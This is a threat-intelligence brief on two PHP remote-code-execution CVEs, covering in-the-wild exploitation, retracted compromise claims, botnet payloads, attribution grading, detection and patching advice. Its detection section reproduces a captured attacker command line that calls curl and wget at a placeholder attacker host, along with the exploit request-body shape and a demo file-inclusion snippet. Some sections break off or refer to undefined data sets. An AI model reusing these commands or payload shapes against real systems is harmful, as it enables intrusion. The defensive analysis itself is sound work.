PHP2Shell: CVE-2026-109618 & CVE-2026-109619

Intelligence brief for SOC and threat hunting teams. Two critical PHP remote-code-execution flaws in the request-lifecycle bailout path, patched on 21 October and under opportunistic mass exploitation within hours. This revision is organised for action: what the bugs are, who is attacking, how to detect them, what to do, with the day's forensics demoted to appendices.

Bottom line

  1. The exploit now works in the wild, and we have the packets. A honeypot operator published, on 24 October, 35 complete execution-stage POSTs each followed within 400 ms by a /bin/sh whose parent is apache2 running as uid=33 — matched across target-side PCAP and kernel process events, from two source addresses, against three targets. That is the first direct evidence in this case that public-tooling-class exploitation reaches a shell. It is not a victim compromise: the targets were disposable honeypots deliberately built in the configuration the exploit needs. See the 26 October update.
  2. It is being exploited, at scale, right now. Hadrian: “We are now seeing php2shell exploited in the wild at scale”, and “most of the attacks we observe abuse PHP’s session upload-progress path”. Cloudflare, Patchstack, Vega and watchTowr all reported attempts within hours of the patch. No successful in-the-wild victim compromise has been confirmed. Both compromise claims made in this case have been retracted — Sophos on 22 October, five hours after making it, and Unit 42 on 25 October. Exploitation at scale, successful exploitation and victim compromise are three different claims; the first two are now evidenced, the third is not. See the 23 and 26 October updates.
  3. FPM is in scope, and the advisory text understated it. The GitHub advisory left PHP-FPM at “considered susceptible by source analysis”. The PHP security team’s own oss-security post is stronger: “Unauthenticated RCE has been demonstrated against Apache mod_php and PHP-FPM.” If your estate is FPM-only, you are not in a second tier.
  4. The mechanism is now properly documented — four bugs under two CVEs. Wiz Research describes 109618 as an upload-progress unserializer use-after-free plus a process-memory disclosure, and 109619 as a fatal-error backtrace use-after-free plus an OPcache type confusion. Every one is a state-survives-a-bailout bug: memory is freed out from under a global pointer, and the next request on the same worker uses it.
  5. The session path the ecosystem built rules for is the one attackers are actually using — not because the leaked PoC was right about the root cause, but because session.upload_progress is the cheapest way to reach it. That partly reprieves the WAF rules deployed on 21 October, but only for 109619. Nothing in that rule set touches 109618.
  6. An unconfirmed claim that the 8.5.12 fix is incomplete. A Fediverse post says the exploit “still works on 8.5.12”. Canonical reportedly asked php.org and was told it is “unrelated and not a real issue”. PHP has not answered publicly and no reproducer has been published. The nearest independent test since — CovertSwarm’s AArch64 work — got execution on 8.5.11 and no execution on 8.5.12 controls, which cuts against the claim without testing its specific reproducer. Unresolved — do not act on it, but do not close the incident on patching alone either.
  7. Discovery credit belongs to Wiz Research, not to the leaker: first bug found 19 August with AI assistance, reported 24 August, acknowledged 21 September, coordinated with PHP, Calif and OpenAI. This replaces the “the leak was the finder” reading this brief carried yesterday.
  8. There are IOCs — and this brief was wrong to say there were none. Earlier revisions queried ThreatFox, OTX and URLhaus and saw zero; those feeds index malicious infrastructure, not attacking hosts seen by canaries. VulnCheck published five addresses, four user-agents, a session ID, a multipart boundary and four SHA-256s; AWS MadPot published six more, including an exploitation attempt on 17 October, four days before disclosure. The indicator that matters most: 221.14.159.134 — the one host that actually tried to exploit — carries no reputation at all, on any instrument.
  9. Still not in CISA KEV — catalog 2026.10.23, 1,756 entries, both CVEs absent, fetched directly 26 October. NVD has since moved both records to Analyzed and added CVSS v3.1 scores (9.8 and 8.1) alongside the 9.2 v4.0.
  10. Attribution: still none for the attacks, with one caveat this brief owes you. The exploitation in your logs is multi-actor and commodity. Separately, CYFIRMA reported on 23 October that a Korean-speaking actor was staging a campaign against unpatched PHP — HIGH confidence in the preparation, only MODERATE confidence in a Lazarus link, with no malware or infrastructure overlap. Preparation is not these attacks. But an earlier revision of this brief wrongly called the circulating Lazarus claim unsupported; it was a degraded relay of a real advisory. Grade the nexus Low–Medium and read the IOC table for what it is — mostly the VulnCheck, AWS and Sophos commodity sets republished. See the 26 October update.
  11. Patching does not fix everything. A third PHP RCE, CVE-2026-115560, was disclosed in an informational advisory on 23 October and is not fixed by the 21 October releases; PHP is holding it for the regular cycle. It needs a narrow and unusual configuration, has no NVD record and no exploitation, and the same session.upload_progress.enabled=0 setting covers it — which is the strongest argument yet for leaving that mitigation in place after patching.

Update · 26 October

Exploitation succeeded — on a host configured the way the exploit needs

Three things moved since the 23 October revision. The first is what this case has been waiting for since 17 October: a capture of the exploit actually working, with the packets and the process tree to prove it. The second is a second retracted compromise claim. The third corrects this brief — the PAN-OS item it recorded on 23 October as unverified turns out to be true.

First end-to-end confirmation — 35 shells, 35 request bodies, three targets

On 24 October, the phpot honeypot project (0x4D31) published “PHP2Shell exploitation observed: packet-to-process RCE evidence”. Across six sensors and three disposable targets, it correlates 35 complete execution-stage HTTP POSTs with 35 /bin/sh starts whose recorded parent is apache2, uid=33. The join is by source port, request sequence and worker PID — not by an alert label or an HTTP status.

Two source-address episodes: 15.204.59.70 (OVH US, vps-b225fb62.vps.ovh.us) produced 3 shells on one target between 15:35 and 16:04 UTC; 162.35.99.94 (Interserver, vps3749638.trouble-free.net) produced 32 across all three between 16:46 and 18:57. Four further addresses sent exploit-shaped traffic with crashes but no shell and no disclosure-sized cookie — 104.28.208.84, 144.48.4.242, and in the earlier window 178.249.214.6 and 89.167.27.27. Those are attempt indicators, not execution.

The chain is the published one, not a new primitive. Four stages: memory pressure (OOM in Unknown on line 0), an 819,200-byte PHPSESSID response cookie carrying pointer-like words, further memory pressure, then a target-adjusted execution body. 51 of 52 disclosure cookies were reconstructed from packet capture and acknowledged by the client — so the leak demonstrably arrived, rather than being assumed. The dominant leaked pointer differed on each target and the execution body tracked it by a constant offset, which is what leak-guided ASLR defeat looks like.

Why this is exploitation, and still not a victim compromise

The distinction is not pedantry, because the reports differ in kind. Sophos and Unit 42 both spoke about victims and both withdrew. This is a controlled experiment in which the attacker won, and the evidence is of a higher grade than either: raw packets plus kernel process events, published with hashes so it can be re-examined.

But look at the target: single-worker Apache mod_php, PHP 8.4.26, 128 MiB memory_limit, plaintext HTTP/80. That is close to the exact precondition list independent analysts gave for a reliable exploit. Iron Castle’s analysis named a low memory_limit, single-worker prefork, and known zval_ptr_dtor/zif_system offsets; the honeypot had all three. A Fediverse commenter made the same point within hours of publication — the write-up “ran in a single-worker setup, which would be very unusual for a real deployment” — and was right.

This resolves the four-day puzzle

“Exploited at scale, nobody succeeding” never made sense as a description of a working exploit. The reconciliation is configuration, not luck: the exploit succeeds where the target has one worker and a tight memory limit, and fails nearly everywhere else because the OOM stage must actually fire and the stale state must survive on the same worker for the next request. Default php-fpm pools with several children and 128–512 MiB spread requests across workers and raise the ceiling. Hunt.io’s sample makes the same point from the other side: 123 targets probed, ~57 running PHP, none exploited. Sansec’s walk-back says it outright — public exploits fail against default installations.

Operationally this inverts the usual prioritisation. Patch everything, but when you triage for likelihood of actual compromise, look first for the pathological cases: single-worker or pm.max_requests=1 pools, low memory_limit, and the session.upload_progress defaults left on. Those are the hosts that match the successful capture.

Unit 42 retracted the second compromise claim — and the press ran it first

Correction — the European government intrusion is real; the PHP2Shell link is not established

Unit 42’s 23 October update described an intrusion at a European government agency: password hashes and MFA secrets read from an application database within roughly two hours, an NTLM-relay tunnel into Active Directory, and an attempted Domain Admin escalation. It read the command traffic as agentic-AI tooling, on the basis of machine-parseable batches wrapped in delimiters such as ==SHELLUSER== and ==PASSWD==.

On 25 October it withdrew the causal claim: “We are unable to confirm that initial access is associated with the specific PHP2Shell CVEs”, and “We have retracted our previous update from October 23.” The intrusion is not retracted — the attribution of its entry point is.

The sequencing matters for anyone reading news rather than advisories. The Hacker News article built on the retracted update (“PHP2Shell Exploitation Hits Government Entity…”) was published at 18:42 UTC on 25 October; Unit 42’s retraction is timestamped 14:15 PT, about 21:15 UTC. Several aggregators and social posts were still carrying the un-retracted version the following morning. Cite the advisory, not the article about it.

That is now two claims raised and two withdrawn in this case — a pattern worth naming, because it is not random. Both came from telemetry that showed post-exploitation-looking activity near a vulnerable application, and in both cases the missing link was the same: nobody could show which request did it. The honeypot work above is the only publication in this case that closes that gap, and it does so by instrumenting the target rather than the victim.

Correction: PAN-OS is affected

This brief called it unverified on 23 October. It is true.

Palo Alto Networks advisory 047910, published 21 October and updated 25 October, confirms that PAN-OS and Panorama are affected — PA-Series and VM-Series firewalls and Panorama (virtual and M-Series) — strictly through the management web interface, meaning the HTTPS UI and the XML API. A dataplane interface is in scope only where a management profile is attached to it. No special configuration is required beyond reachability.

The circulating claim this brief declined to carry on 23 October was therefore right about the impact and roughly right about the dates. It was still correct to withhold it at the time: the 23 October version named no vendor advisory and added a 26–30 October hotfix window that then shifted per branch. The lesson is not “believe rumours” but the narrower one this project already carries — a claim is unverified until a primary source exists, and then it is verified, not vindicated.

Hotfixes 10.2.18-h13, 11.1.16-h4 and 11.2.10-h16 shipped on 25 October; the remaining branches are estimated 27–30 October and Panorama has no published ETA. Palo Alto states it is not aware of exploitation against its products, and lists exploit maturity as N/A.

Read the score, not the number. Palo Alto rates this 8.7 High with vector VC:N/VI:N/VA:H — availability only — against PHP’s 9.2 with confidentiality and integrity high. Same bug, different product consequence: on PAN-OS the management plane can be crashed and coerced, which is severe, but the vendor is not claiming code execution in its own context. Plan the patch from that, and do not assume a PAN-OS 8.7 and a PHP 9.2 are the same emergency.

A third bug, and it will not be patched in a hurry — CVE-2026-115560

PHP published an informational advisory on 23 October for a third remote-code-execution path in the same feature area. The conditions are narrow and cumulative: an application must set session.serialize_handler to php_binary or php_serialize in configuration, then switch it to php at runtime with ini_set() before session_start(), with session.upload_progress still enabled. The underlying hazard is old — PHP bug #71101 (2015), which warns that the serialize handler must not be switched for existing sessions.

PHP Foundation executive director Elizabeth Barron: the flaw “requires a very unlikely combination of configuration and specific PHP application code” and “we do not expect to occur in practical use of PHP”. It is being held for the regular release cycle rather than an emergency fix, and will get a full advisory with the next bugfix release. Verified 26 October: no NVD record exists, and no PHP release has shipped since 21 October — 8.5.12, 8.4.27, 8.3.36 and 8.2.35 remain the newest on every branch. No exploitation reported.

The practical consequence is one line: do not remove session.upload_progress.enabled=0 after patching. It is the entire published mitigation for 115560, and Rapid7’s ordering rule still applies — it must be set before request parsing, in php.ini, the FPM pool or the server config, and every worker restarted. ini_set() and .user.ini remain too late.

Did anyone actually patch? Two measurements

For once there is adoption data rather than anecdote.

  • Vu Agency scanned ~1M sites (22–23 October) that had previously advertised a pre-fix PHP version. Of 824,947 that still returned a version: 24% showed a fixed release, and a further 23% were on Hostinger and judged likely patched because Hostinger applied the fix without changing the version string. Roughly half showed an older number whose patch state cannot be determined externally — because CloudLinux and Plesk backports keep the old version number. 139,706 returned nothing.
  • Qualys, across anonymised data from 12,000 customers, counted 199,000 PHP instances patched within 12 hours of disclosure — against roughly 110 million instances (71%) on end-of-life PHP 5.4–8.1 that will never receive a vendor fix, plus another 44 million on supported branches with a patch available and unapplied.

Treat external patch measurement as a floor, not a census. Version strings are the wrong instrument for backported fixes in both directions: it under-counts patched CloudLinux and Hostinger hosts and over-counts nothing. The 24% figure is a lower bound on a sample that was already known to be exposed.

Four themes, and one that should be discarded:

  1. The AI-exploit narrative is being pushed back on by practitioners, not amplified. The dominant security-community framing is that AI assistance shortened discovery and analysis but did not hand anyone an exploit. “Anyone claiming ‘AI removed the cost’ for the binary analysis and exploitation of PHP2Shell doesn’t know ball” is representative; a German-language thread makes the same argument at length. This sits directly against the 404 Media and Politico angles (“AI Is Changing Everything About Hacking”), and it is corroborated by the technical record: Sophos found building a working exploit hard even with AI support, and the successful chain above still needed hand-tuned offsets and a favourable target.
  2. The honeypot write-up was met with immediate, correct methodological criticism — the single-worker, tight-memory configuration is not a normal production target. That criticism does not weaken the finding; it explains the gap between “exploited at scale” and “no compromises”, which is the single most useful analytical result of the week. Read the two together.
  3. Retraction lag is a live misinformation mechanism. The Unit 42 intrusion story propagated for roughly twelve hours before the correction, and social posts carrying the un-retracted version were still circulating a day later. The same happened on a smaller scale with Sophos on 22 October. On this incident, advisories moved faster than the conversation about them.
  4. Collateral effects are showing up outside security reporting. A game project, SuperTuxKart, took its servers offline and is rebuilding in Python; the Internet Archive, Orange, ANA, Swiss host Cyon (>100,000 sites) and 32 UK government services took precautionary action. This is the “hundreds of websites” claim from 21 October, now with named examples.

The DPRK question

Correction — this brief said “no primary source supports it”. That was wrong.

CYFIRMA published a vendor advisory on 23 October: “Suspected DPRK Campaign staging PHP2Shell Targeting against Global PHP Infrastructure”, naming the activity the “June 2026 Minjun” campaign. The circulating social post was therefore a degraded relay of a real advisory, not a fabrication — and the earlier revision of this section, which dismissed it outright, was itself an absence-of-evidence error of exactly the kind this brief warns about: I searched for a primary source, did not surface this one, and wrote the negative as if the search had been exhaustive.

What CYFIRMA reported: a Korean-language operator channel on closed I2P, monitored on 22 October between 11:00 and 11:31 JST, discussing reconnaissance against PHP2Shell-vulnerable hosts, passive version collection, target sorting by country and sector, infrastructure staging and testing of public PoC code. Fifteen staging IPs were shared in-channel. A first filtered target list was due 25 October; no launch date was set and no victim was named.

Its own confidence split is the important part: CYFIRMA rates the activity HIGH and the Lazarus-ecosystem link MODERATE, and is explicit that there is an “absence of definitive malware or infrastructure overlap”. The basis is language (North Korean Munhwaŏ vocabulary), targeting pattern and historical Lazarus web-shell tradecraft. That is a behavioural, not a technical, linkage. Korea’s MSIT and KISA issued a “caution” alert on 22 October — generic vulnerability guidance that did not confirm the campaign or the attribution — and Korean press coverage (JoongAng Ilbo, SBS) quotes experts saying language and sector choice alone do not establish DPRK involvement.

Two things fall out. The staging set is curated infrastructure — paired endpoints inside the same /24 or /22, entirely on privacy-tolerant hosting, and structurally unlike an ambient scanner population. The tooling set is a commodity crowd, a third of it on home broadband across five countries, with no prefix sharing at all. And the set that matters is the quiet one: every instrument scores set A lower than set B. An analyst who ranked these by abuse score would have promoted the scanners and filed the staging infrastructure as clean.

But “staging” does not survive the banners. Reverse DNS and exposed services on set A do not describe a target-list host at all. One member is a student VM at the Slovak University of Technology (vm103.studenti.fiit.stuba.sk). One is a Home Assistant smart-home hub on a village DSL line (hrubonovo.ostv.sk). One is a MikroTik router on another village line, exposing Winbox :8291, the MikroTik API on :8728 and SNMP (velke-ripnany.ostv.sk). One is a Danish mobile-broadband subscriber. One is a DataPacket VPN exit; two more are M247 IPsec concentrators, where Shodan reads the IKE handshake on :500 directly. Seven of sixteen resolve to a PTR and not one of them is a hosting hostname.

That reads as an access and egress layer, not a staging layer — what an operator routes through, or what is traded in a channel as a usable proxy. The inference is ours, not the vendor’s, and it is an inference from service signature and naming rather than proof; the operators could control some of these outright. But the operational consequence is not in doubt: if these are exits, blocking them does not degrade the actor — it blocks a university student, two Slovak households, a mobile subscriber and a fire-service dispatcher, and the operator moves to the next exit. Take “monitor and hunt rather than blind-block” literally. The MikroTik entry is worth naming separately because this project already carries the rule that a MikroTik fingerprint is a flag, not a selector: being behind one says nothing about who is using it. How this brief grades it now
  • Attack preparation by a Korean-speaking actor: MEDIUM. Single vendor, one closed I2P channel, a 31-minute collection window, no corroborating sensor. Credible, and now structurally consistent with the infrastructure, but not independently verified.
  • Link to the Lazarus ecosystem: LOW–MEDIUM. The vendor itself says MODERATE on behavioural grounds only, with no malware-family or infrastructure overlap. Set A’s concentration on privacy hosting is consistent with a resourced actor but equally consistent with any criminal operator; it is not discriminative.
  • The 15 staging addresses: MONITOR, not block. This is the vendor’s own instruction and it is the right one — several sit on shared VPN egress where a block creates collateral for unrelated tenants. Hunt for contact, do not pre-emptively deny.
  • The 17 tooling addresses: grade as commodity. They are heavily-reported scanners (median 63%, 880 reports between them) and the vendor does not link them to the channel. Block on local evidence, not on this list.
  • The 21 U3 nodes: block at the perimeter only if your logs show contact, and treat ownership as unknown. The vendor warns some may be victims. This brief has a standing rule against blocking compromised third parties; it applies here.
  • Corrected — “216” is real and is a v3 figure. The operators completed a filtered target set a day early of 216 hosts that “still appear unpatched or only partially mitigated”, having dropped hosts “bannering the fixed versions”. The operationally meaningful companion number is that “roughly one third of the target set had already been touched” — on the order of 70 hosts probed, not 216. This brief recorded it as unverified on the strength of two synopsis mirrors; that was wrong, and the primary advisory carries it.
  • Not carried: the social post’s formulation “Lazarus Group Targets PHP2Shell”, which states the attribution far more strongly than the advisory does.

The standing position on the exploitation of these CVEs is unchanged: opportunistic, multi-actor, mostly commodity. A state-nexus actor staging an operation against unpatched PHP does not make the scans in your logs that actor, and it does not change the patch advice — it changes who you tell, and how urgently you look for webshells on hosts that were exposed and unpatched. What it does change is the priority of the search: a filtered list of 216 by country and sector, a third already touched, is a target-selection exercise, and the useful defensive response is to determine whether you are on it.

The circularity in the “HIGH confidence” figure — read both halves or neither

CYFIRMA’s HIGH-confidence sentence reads that “a North Korean state-nexus threat actor … is actively staging a global offensive campaign”. The DPRK-ness is the moderate-confidence part, yet it is restated as a premise inside the high-confidence sentence. Every secondary outlet that quotes “HIGH confidence” without “MODERATE — Lazarus affiliation” is misrepresenting the advisory, and several did. CYFIRMA also explicitly left open “the possibility of an ordinary Korean-speaking criminal organisation”.

And the collection itself has a documented challenge. A compromise claim withdrawn, and a botnet payload identified

Two things moved. A sensor operator retracted the only first-party compromise claim in this case, and the same disclosure named what the exploitation attempts are actually delivering. Neither changes the patching advice; both change the threat picture.

Correction — Sophos withdrew its compromise claim five hours after making it

22 Oct 16:18 UTC. Sophos reported “observed successful exploitation of PHP2Shell in customer environments”, describing multiple attempts and “one successful exploitation”, with a payload written to /tmp/nfs and executed as ./nfs php.

22 Oct 21:21 UTC. Retracted: “we are correcting that assessment.” The corrected position is that telemetry shows “scanning and a small number of failed exploitation attempts”, the payload “was not delivered” because Sophos countermeasures stopped the attempt, and “there is no evidence of a successful compromise due to these vulnerabilities.”

This matters more than a normal correction. It was the only compromise claim with a first party behind it in the entire case, and it survived five hours. The “no confirmed compromise” line elsewhere in this brief is now a positive finding — a claim raised and withdrawn — rather than only an absence of reporting.

What was being delivered — Potassium

The payload is Potassium, a Mirai-derived botnet described as an updated and significantly expanded version of a variant seen in early 2026, with downloader and network-disruption functionality. It resolves a hard-coded encrypted C2, opens a TCP connection, checks for an HTTP 200, verifies the response begins with the ELF magic bytes 7F 45 4C 46, and then retrieves a Linux follow-on binary. Its resolver falls back to 8.8.8.8, 1.1.1.1 and 1.0.0.1.

That reframes the motive. The exploitation observed in this case is botnet recruitment, not espionage or extortion: a compromised PHP host becomes a DDoS node. It is also the first concrete answer to “what would an attacker do with this?” — and it is opportunistic commodity crime, which matches the absence of any actor attribution.

Refinements later on 23 October

The private exploit got broader, and the public ones stayed narrow. VulnCheck reports its weaponised CVE-2026-109618 exploit now covers PHP 8.4.10–8.4.26 "with no modifications", up from 8.4.26 alone by 19:00 ET on 22 October, and it works on x86-64 with ASLR enabled and display_errors=off. On ARM64 the memory leak works but RCE is not functional and ASLR is described as brute-forceable. By contrast, of the hundreds of public repositories, "only a very small number have been legitimate exploits"; exactly one bypassed ASLR — on 8.4.26 with default heap configuration only, and it did not work outside that setup. That independently matches the grading on this page: three of twenty-three artefacts engaged the real mechanism.

The mitigation ordering matters more than the settings. Rapid7 is explicit that session.upload_progress.enabled=0 must be applied before request parsing — through php.ini, FPM or server configuration, because ini_set() and .user.ini are too late — and that every worker must then be restarted, since stale state lives in the worker, not the config. The same applies to fatal_error_backtraces=0 on 8.5 and to an administrative memory_limit=-1. Do not lean on cgroup or container memory limits, or on RLIMIT_AS/RLIMIT_DATA: those are the counter-indicated paths this brief already records.

Inventory: Rapid7 published a Velociraptor artifact, Generic.Applications.PHPInventory, which enumerates PHP installations and running processes across Windows, Linux and macOS — the cheapest way to find embedded runtimes that a host package manager does not manage.

Both advisories carry the same five weaknesses — CWE-416 (use after free), CWE-755, CWE-824 (access of uninitialised pointer), CWE-1325 and CWE-1419 — and the same vector: CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N. The OOM triggers the advisory actually names

  • Multipart requests without a usable declared Content-Length.
  • An unrestricted number of multipart headers.
  • Empty file controls that evade max_file_uploads while still creating metadata arrays — especially with nested field names.

That list matters operationally: it is not a signature you can match on a User-Agent or a field name. It is three shapes of request that any large legitimate upload also produces. The discriminator is the outcome — a memory-exhaustion fatal during startup — not the request.

The uncomfortable finding

The public exploit ecosystem spent roughly twelve hours optimising against Model A — a use-after-free in the session handler — and the WAF rules, the scan tools and and most of the repositories created in the first twelve hours are built on that reading. The actual bug is state corruption during a bailout, upstream of all of it. Anyone who deployed a rule matching PHP_SESSION_UPLOAD_PROGRESS plus PHPSESSID has a rule for one consumer of one of the two CVEs, and nothing for the other.

The session path is still worth blocking — the advisory confirms it — but it is one of several. That is precisely why the vendor says updating is the only complete answer.

What Wiz adds — the four bugs behind the two IDs

The GitHub advisories are one paragraph each. Wiz Research’s write-up, published after the patch, is the first detailed public account, and it splits each CVE into two distinct defects:

CVEDefectMechanism, in Wiz’s terms
109618Upload-progress unserializer UAF“The decoder stores request-owned bookkeeping in BG(unserialize).” A fatal allocation failure destroys the request heap but leaves the unserializer’s global state published; a later request on the same worker treats attacker-reclaimed memory as live bookkeeping.
Process-memory disclosureMultipart parsing runs before module initialisation, so an OOM abort leaves PS(id) pointing at freed memory. A later multipart request has that stale pointer encoded into a PHPSESSID cookie — exfiltrating engine memory, including “passwords, authentication tokens, API keys and certificates”.
109619Fatal-error backtrace UAFThe last fatal error’s backtrace is kept in EG(last_fatal_error_backtrace); an OOM frees the heap without clearing it, and a diagnostic in the next request dereferences the stale pointer.
OPcache type confusionThe local CG(map_ptr_last) frontier advances before the shared frontier is published. An allocation failure in between leaves partially persisted objects pointing at slots other workers consider free.

Two consequences worth stating plainly. First, the cookie is an exfiltration channel: a malformed or over-long PHPSESSID in a response is not cosmetic, it is the memory-disclosure primitive working. Second, Wiz notes that further variants exist and fall under the same CVE identifiers — so patching to the fixed releases is the control, not matching any single one of these four.

Wiz also demonstrated unauthenticated RCE against current WordPress, Drupal and Joomla container images, and states the obvious but important point: “Exploitation does not depend on a flaw in the application’s code.”

Discovery, coordination, and a correction to yesterday’s revision

Wiz Research — Sagi Tzadik, Shir Tamari, Nir Ohfeld and Tomer Schwartz — found the first bug on 19 August 2026 using AI tooling, reported it to PHP on 24 August, and had acknowledgement on 21 September. Coordination ran with the PHP team, Calif and OpenAI, alongside Akamai, AWS, Cloudflare, Fastly, Google, Microsoft, Automattic, Imperva and Vercel.

Retracting a correction — this one is mine, twice over

Yesterday this brief graded @calif_io’s coordination claim as Unconfirmed, then upgraded it to partly-confirmed when reporting credited “Calif, Wiz, and OpenAI security researchers” as co-discoverers. Both readings were wrong in the same direction: they over-credited the account that leaked.

The primary source settles it. Wiz Research discovered and reported the bugs. Calif and OpenAI were coordination participants, not finders. The account that dropped the identifiers and the demo on 20 October, twenty-two hours before the fix, was neither the discoverer nor a bystander — it was a participant in a coordinated disclosure that went early. Credit for the finding belongs to four named Wiz researchers.

The methodological lesson stands and sharpens: a participant who publishes ahead of the embargo will look, from the outside, exactly like the source. Only the vendor’s own account separates them, and it took a full day for that account to arrive.

Detection and hunting

Hunt the effect, not the request

Updated 14:05 UTC — the advisory changes which signal is primary

Before the advisory, the best available detector was the session-file artefact written by one PoC. Now that CVE-2026-109618 is known to be an OOM bailout, there is a better one, and it is not a request signature at all: a memory-exhaustion fatal raised before application code runs. That is the precondition for the bailout that leaves request memory invalid.

The line to look for is the standard allocation failure, and the tell is its location — in Unknown on line 0, because no script has been compiled yet:

Allowed memory size of <N> bytes exhausted (tried to allocate <M> bytes) in Unknown on line 0
Grep every PHP error log, FPM pool log and LiteSpeed STDERR sink for this shape

Two cautions. This fires on legitimate traffic too — a large upload against a tight memory_limit is exactly the benign case — so baseline it and alert on rate and clustering rather than on single events. And if you have already applied memory_limit=-1 as a stopgap, you have blinded this signal: prefer the patched release over the stopgap precisely because the stopgap costs you your best detector.

Added 26 October — the one signal that is not a heuristic

Everything above is a proxy: OOM fatals fire on benign uploads, oversized cookies can be app behaviour, worker crashes happen. A shell process whose parent is the web server is not a proxy. The confirmed capture found it by joining Apache worker PIDs to kernel process events, and it looks like this:

apache2 -> /bin/sh   uid=33   parent.binary=/usr/sbin/apache2
/bin/sh -> id | php -r ... | curl http://<attacker>/pwn-<host> | wget -q -O- ...
Any shell, interpreter or downloader spawning under apache2/httpd/php-fpm/lsphp as www-data is the finding, not the evidence of one

Hunt it on process parentage, not command text: the observed commands changed between id, PHP CLI, curl and wget, and later embedded $(id -un)/$(hostname)/$(uname -m) so that each callback identified its victim. Also note what the capture showed about absence: the successful final request often leaves no completed Apache access-log line, because the worker segfaults after starting the shell. An HTTP 200 on the earlier stages means nothing, and a missing log line is not a missing attack.

The request itself, for the CVE-2026-109618 chain

Datadog reproduced the OOM chain and published the exact body shape. It is short and specific enough to match, and unlike a User-Agent it is dictated by the exploit’s memory layout rather than by author taste:

=<binary value>&a=1&<very long field name>[x]=1
application/x-www-form-urlencoded POST — empty-name field, binary value, then an oversized nested key
  • An empty field name whose value contains raw NUL bytes — the groom payload.
  • a=1 — forces reuse of the freed 320-byte block.
  • A field name of roughly 3.5 MB ending in [x]=1 — the allocation that exceeds memory_limit mid-initialisation.

Corelight’s open-source Zeek notices encode the same idea behaviourally and are worth taking whole: Large_Form_Key, Multipart_Header_Flood, Serialized_Integer_Overflow, Serialized_Integer_Collisions, Serialized_String_Collisions, Serialized_Duplicate_Array, Serialized_Object_Repetition, PHP_Crash_Sequence and Potentially_Affected_PHP_Version. This is the detection set to deploy if you have HTTP visibility; it does not depend on any IOC and it does not depend on the session path.

Request-level signatures are weak here for a structural reason the advisory now makes explicit: the triggers are ordinary multipart shapes — no usable Content-Length, many headers, empty file controls with nested field names. TLS hides the body, and none of those shapes is anomalous on its own. What does not vary cheaply is what happens next: the OOM fatal, PHP spawning a shell, and PHP writing code into a session file.

Action plan

What to do now that the patch is out

Patch — there is nothing else that is complete

  1. Update to 8.5.12, 8.4.27, 8.3.36 or 8.2.35, internet-facing first. PHP's own line is unambiguous: "There are no complete mitigations, updating is the only safe choice."
  2. Restart the SAPI, not just the package. A long-running FPM pool keeps its workers; the 109619 fix is a state reset per request, but the stale-state window is per worker. pm.max_requests=1 is the blunt version if you cannot restart cleanly.
  3. Use the official backports for 7.4 / 8.0 / 8.1. PHP published minimal source backports precisely because those branches will never ship a release. If you depend on rpms.remirepo.net, note PHP's explicit warning that the repo will not have updates today — switch to distribution packages or build from source.
  4. Do not assume your vendor is ahead of you. Distributions and LTS vendors received patches in advance, but backport timing varies. Check each vendor rather than waiting for a mirror to catch up.

If you cannot patch this hour — the vendor's own stopgaps

These reduce exposure to specific paths. They do not make an installation safe, and PHP says so directly. Apply them in this order:

Two controls that will hurt you if applied on instinct

Do not add RLIMIT_AS or RLIMIT_DATA. Both are standard hardening for runaway PHP processes and both are explicitly counter-indicated here — they can cause exactly the allocation failure that reaches the vulnerable longjmp() path. Use a container or cgroup limit as the availability boundary instead, with a policy that kills only the affected worker.

Do not lead with the WAF rules. The rules circulating since 02:00 UTC match PHP_SESSION_UPLOAD_PROGRESS with PHPSESSID — one consumer of 109619. They do nothing about 109618, which is triggered by ordinary multipart shapes and has no distinguishing request signature at all.

After — the retrospective hunt

  1. Hunt back to 20 October 15:20 UTC, when the identifiers became public, and to 21 October 01:58 UTC, when the bundle became downloadable.
  2. Check the two artefacts that survive: session files containing <?php, and web-user processes spawning shells.
  3. Watch CISA KEV. A listing would convert every unpatched host from a priority into a deadline.
  4. The dispute about the upload_progress stopgap is now settled, and the pessimists were right. The bundle author said it closes one of two paths, break-the-build said lab testing closed the whole vulnerable path, GMO Flatt Security said it "mitigates only". The advisory sides with GMO Flatt: disabling it "blocks the confirmed session paths but not other variants". It is a partial control, not a fix.
If you can only do one thing today

Find every host where PHP runs under mod_php. That is the SAPI the advisory calls highest risk and the only one where a complete exploit was demonstrated over HTTP on default settings. FPM was not fully exploited, but it was not cleared either — source analysis calls it susceptible. If your estate is FPM-only, your urgency is real but your exposure is one step lower than a prefork mod_php shop's.

Four findings

  • The most-copied claim in the ecosystem contradicts the CNA record. At least six reviewed repositories state that “PHP 5.4.0 through 8.5.11” is affected. MITRE’s affected set is 8.2–8.5. The 5.4 start describes the older session technique, not these CVEs — and it is being copied between READMEs without anyone checking it.
  • Only three of 23 engage the advisory’s mechanism. The other twenty implement or discuss the session.upload_progress + LFI path — the consumer route that public analysis converged on precisely because the leaked PoC exercised it.
  • The two projects that got it right are the two that tested a real image. 9bie and dinosn each name an exact build and each state their constraint (display_errors=1). The high-star repositories that did not test publish confident version ranges instead.
  • Star count is anti-correlated with accuracy here. The two most-starred artefacts (1,134 and 667) are a partial and a mislabelled one. The aligned projects sit at 639, 64 and 17.
The off-GitHub artefact — git.kurosek.com/neko/php2shell

Not in the GitHub population because it is a personal Gitea instance: one commit, created 2026-10-21T16:38Z, zero stars, no licence. It advertises “three confirmed bypass paths that defeat the official security patch”.

Its own demo target is the tell. Both CVE directories ship the same “vulnerable” application:

session_start();
if (isset($_GET['page'])) { include($_GET['page']); }
The demo “vulnerable” target — identical in both CVE directories

That is an LFI by construction. Every script in the repository ends in “include a file I control via the app’s LFI”. The three claimed bypasses — a TOCTOU window on the session file, an aborted upload via RLIMIT_AS, and reading PHP’s upload temp file through /proc/<pid>/fd — are all LFI tricks that work on every PHP version and touch none of the patched code. Its own single negative result argues against its thesis: “Multipart part header flood: OOM triggered but the patch handles it correctly (exit code 70, session file cleaned up).”

Do not use it as a patch-verification tool. Run against a fully patched host that happens to have an LFI, it reports RCE — and the operator concludes the PHP fix is broken when their application is.

Safety scan — no trojanised PoC in the reviewed set

Primary exploit file fetched and scanned for each code-shipping repository. Appendix A · retired models

Five competing models — all of them wrong

Read this before the models below

This section is retained as an audit trail of what the public believed between 03:55 and 13:44 UTC. Every model in it is now retired against the vendor advisory, which locates both CVEs in bailout and stale-state handling rather than in the session handler, the unserializer's destructor list, or zend_user_unserialize(). The resolution table in the advisory section above shows verdict by verdict.

